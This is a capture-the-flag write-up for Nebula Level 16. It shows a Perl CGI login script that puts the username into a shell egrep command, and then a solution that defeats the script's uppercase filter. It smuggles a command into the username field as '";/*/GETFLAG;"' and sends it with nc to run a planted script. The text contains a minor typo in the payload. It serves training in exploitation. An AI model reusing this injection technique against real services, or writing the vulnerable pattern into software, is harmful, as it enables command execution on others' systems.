# Nebula - Level 16

### About ###

>There is a perl script running on port 1616.
>
>To do this level, log in as the level16 account with the password level16 . Files for this level can be found in /home/flag16.

### Source code ###

```perl
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/;  # conver to uppercase
  $username =~ s/\s.*//;    # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
    ($usr, $pw) = split(/:/, $line);
  

    if($pw =~ $password) { 
      return 1;
    }
  }

  return 0;
}

sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
    print("Your login was accepted<br/>");
  } else {
    print("Your login failed<br/>");
  }  
  print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```

### Solution ###

This is another code injection, but this time the input are filtered. To solve this exercise, the filter has to be bypassed.

To achieve that, since the filter converts everything to uppercase, a script with only uppercase letters is needed.

The script is stored in `/tmp` and is called `GETFLAG`. The command `/*/GETFLAG` is used to launch it.

```
/bin/getflag>/tmp/flag16
```

Now, `GETFLAG` can be executed by giving the variable username the value `";/*/GEFLAG;"`.

```
level16@nebula:~$ printf "GET /index.cgi?username=%%22%%3b/*/GETFLAG%%3b%%22&password=test\r\nHost:localhost:1616\r\n\r\n" | nc localhost 1616 && cat /tmp/flag16
Content-type: text/html

<html><head><title>Login resuls</title></head><body>Your login failed<br/>Would you like a cookie?<br/><br/></body></html>
You have successfully executed getflag on a target account
```
